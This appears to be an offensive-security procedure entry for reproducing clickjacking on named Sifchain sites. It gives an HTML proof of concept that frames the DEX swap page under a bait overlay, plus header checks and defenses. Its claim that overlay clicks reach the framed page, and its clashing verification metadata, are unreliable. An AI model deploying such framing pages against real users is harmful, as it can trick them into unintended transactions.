---
id: proc-clickjacking-repro-001
name: Reproduce-Clickjacking-on-Sifchain-Sites
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:04.748Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - clickjacking
  - x-frame-options
  - web-vulnerability
platforms:
  - Web
tools:
  - '[[tools/Firefox-Browser]]'
skill_level: beginner
impact_level: medium
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Reproduce-Clickjacking-on-Sifchain-Sites

## Summary

This procedure reproduces the clickjacking vulnerability on Sifchain websites by creating an HTML page that embeds unprotected endpoints in iframes, allowing attackers to overlay malicious UI elements and hijack user clicks for unauthorized actions like token swaps or delegations.

## Description

Clickjacking, or UI redressing, exploits the absence of the X-Frame-Options header (set to DENY or SAMEORIGIN) on public-facing web applications. In this case, multiple Sifchain sites such as the finance dashboard and DEX interfaces can be iframed on a malicious domain. An attacker crafts a page with transparent or overlaid elements that trick users into clicking hidden controls, potentially leading to phishing-like interactions, unauthorized transactions, or sensitive data exposure. The vulnerability was identified by inspecting response headers via browser dev tools and confirmed by successful iframe embedding. Prerequisites include a web browser and basic HTML knowledge; no server-side access is needed.

## Requirements

1. Internet access to reach Sifchain URLs (e.g., https://sifchain.finance/)
2. A web browser like Firefox for testing
3. Local file system access to save and load an HTML file

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN in server responses
- Use Content-Security-Policy (CSP) with frame-ancestors directive to restrict framing
- Monitor for unusual iframe embeddings via web application firewall (WAF) logs
- Educate users on phishing risks and verify site authenticity

## Objectives

1. Verify that Sifchain sites can be embedded in iframes without restrictions
2. Demonstrate potential for click hijacking on interactive elements like swap buttons
3. Assess impact on user actions and platform integrity

## Instructions

### Step 1: Inspect Headers for Vulnerability

**Context**: Confirm the absence of X-Frame-Options by checking response headers of target URLs.

Open [[tools/Firefox-Browser]] developer tools (F12), navigate to Network tab, and load a target URL like https://sifchain.finance/. Look for the X-Frame-Options header in the response.

**Expected Output**: No X-Frame-Options header present, or not set to DENY/SAMEORIGIN.

### Step 2: Create and Load Malicious HTML Page

**Context**: Build a proof-of-concept HTML file to embed the vulnerable site in an iframe and overlay a bait element to hijack clicks.

Create a file named `clickjack-demo.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body { margin: 0; padding: 0; }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1024px;
            height: 768px;
            border: none;
            opacity: 0.5; /* Make semi-transparent for demo */
        }
        .overlay {
            position: absolute;
            top: 200px;
            left: 300px;
            z-index: 10;
            width: 150px;
            height: 40px;
            background: rgba(255,0,0,0.5);
            color: white;
            text-align: center;
            line-height: 40px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="overlay" onclick="alert('Your click was hijacked! This would trigger an action on the embedded site.')">Click Here to Win!</div>
    <iframe src="https://dex.sifchain.finance/#/swap"></iframe>
    <!-- Repeat for other URLs: https://sifchain.finance/, https://blockexplorer.sifchain.finance/transactions, etc. -->
</body>
</html>
```

Save the file locally and open it in [[tools/Firefox-Browser]] by dragging it into the browser or using File > Open File.

**Expected Output**: The Sifchain DEX swap page loads inside the iframe. Clicking the red overlay should align with a sensitive button on the embedded page (e.g., swap confirmation), demonstrating hijacking.

### Step 3: Verify and Test Interactions

**Context**: Interact with the page to confirm click hijacking works without frame restrictions.

Adjust iframe opacity to 1 for full visibility if needed, then click the overlay while monitoring the embedded site's behavior in dev tools.

**Expected Output**: Clicks propagate to the iframe, potentially submitting forms or navigating without user intent.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox-Browser]]

## Tags

- [[clickjacking]]
- [[x-frame-options]]
- [[web-vulnerability]]
